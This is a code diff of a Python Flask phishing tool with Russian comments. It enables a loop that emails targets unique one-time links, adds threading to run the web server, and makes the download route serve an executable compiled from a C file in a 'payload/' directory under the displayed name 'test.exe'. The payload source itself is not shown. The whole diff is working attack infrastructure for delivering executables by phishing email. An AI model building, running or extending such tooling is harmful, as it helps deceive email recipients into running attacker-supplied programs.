@@ -2,6 +2,7 @@ import random
 import string
 from subprocess import check_output
 import os
+import threading
 
 from flask import Flask, abort, send_file
 import smtplib
@@ -10,9 +11,6 @@ from email.mime.text import MIMEText
 
 config_url = {
     "prefics_url":"media="                              # Статичный префикс фишинговой ссылки, после него идет радномно сгенерированная строка
-}
-config_file_upload = {
-    "filename":"test.txt"                               # Файл, который будет отгружаться пользователю (следующиая идея -> уникальный файл для каждой ссылки)
 }
 config_mail = {
     "username":"user1@exemple.com",                     # От имени кого будет отправляться сообщение
@@ -25,8 +23,9 @@ fishing_user_mail = [
     "user2@exemple.com"                                 # Пользователи, которым будут отправлены фишинговые письма
 ]
 config_executable_file = {
-    "dir":"payload/",
-    "filename_c":"test.c",
+    "dir":"payload/",                                   # Директория, в которой лежит исходный файл на C
+    "filename_c":"test.c",                              # Файл на С, в котором находится точка фхода
+    "displaying_file_user":"test.exe"                   # Имя файла, которое отобразится у пользователя после скачивания
 }
 
 random_urls = {}
@@ -37,8 +36,8 @@ app = Flask(__name__)               # Создаем экземпляр прил
 
 
 def send_email(subject, message, mail_server, from_addr, to_addr, password):
-    msg['Subject'] = subject                        # Заголовок письма
     msg = MIMEText(message)                         # Текст письма
+    msg['Subject'] = subject                        # Заголовок письма
     msg['From'] = from_addr                         # От кого письмо        
     msg['To'] = to_addr                             # Кому письмо
     server = smtplib.SMTP(mail_server, 587)         # Указываем параметры сервера
@@ -80,7 +79,7 @@ def generate_random_url(number_random_url: int):
         
         executable_file = compiling_executable_file()
         
-        random_urls[result_random_url].append(executable_file)
+        random_urls[result_random_url].append(executable_file)                  # Добавляем вторым параметром имя файла, связанного с этим url
 
 
 @app.route("/download/<password_url>")
@@ -90,14 +89,13 @@ def download(password_url):
     
     if password_url in urls:                    # Если запрошенный url является одним из сгенерированных, то идем дальше
         
-        if random_urls[password_url] == 1:      # Если статут этого url адреса активен, то идем дальше
-            random_urls[password_url] = 0       # После это деактивируем его, чтобы второй запрос не прошел
+        if random_urls[password_url][0] == 1:   # Если статут этого url адреса активен, то идем дальше
+            random_urls[password_url][0] = 0    # После это деактивируем его, чтобы второй запрос не прошел
             #return(password_url)
             return send_file(
-                # config_file_upload["filename"],
-                config_file_upload[random_urls[password_url][1]],
-                as_attachment=True,                             # Автоматически добавляет Content-Disposition: attachment
-                download_name=config_file_upload["test.exe"]    # Указывает имя для скачивания
+                random_urls[password_url][1],                                 # Указвыаем путь и имя файла, который отправится пользователю, связанного с данным url
+                as_attachment=True,                                           # Автоматически добавляет Content-Disposition: attachment
+                download_name=config_executable_file["displaying_file_user"]  # Указывает имя для скачивания (оно отобразится у пользователя)
             )
         else:
             abort(404)                          # Если url адрес деактивирован
@@ -113,26 +111,35 @@ def start_fishing():
     urls = list(random_urls.keys())             # Получаем все url адреса из словаря
     i = 0                                       # Счетчик, чтобы у каждого пользователя была уникальная ссылка
 
-    # for user_mail in fishing_user_mail:
+    for user_mail in fishing_user_mail:
 
-    #     send_email(
-    #         "Test massage",
-    #         f"Hello! The test massage! http://{config_mail['fishing_server']}{config_mail['fishing_url']}/{urls[i]}",
-    #         config_mail["server"],
-    #         config_mail["username"],
-    #         user_mail,
-    #         config_mail["password"]
-    #     )
-    #     i += 1
+        send_email(
+            "Test massage",
+            f"Hello! The test massage! http://{config_mail['fishing_server']}{config_mail['fishing_url']}/{urls[i]}",
+            config_mail["server"],
+            config_mail["username"],
+            user_mail,
+            config_mail["password"]
+        )
+        i += 1
+
+
+def start_web_server():
+    print("[i] Start WEB server")
+    app.run(host='127.0.0.1', port=80)
+    # app.run(host='127.0.0.1', port=80) #, debug=True)
 
 
 if __name__ == "__main__":
 
-    # print("[i] Start WEB server")
-    # app.run(host='127.0.0.1', port=80) #, debug=True)
+    server_thread = threading.Thread(target=start_web_server)   # Указываем функцию, которая будет вызываеться в отдельном потоке
+    # server_thread.daemon = True                               # Указываем, что данный поток должен завершится при завершении основного потока (в таком случае Flask запуститься и завершит свою работу, когда завершится программа)
+    server_thread.start()                                       # Запускаем данный поток
 
     print("[i] Start Fishaing...")
     start_fishing()
+
+    server_thread.join()                                        # Ждем, пока поток Flask не завержится
     
 
 
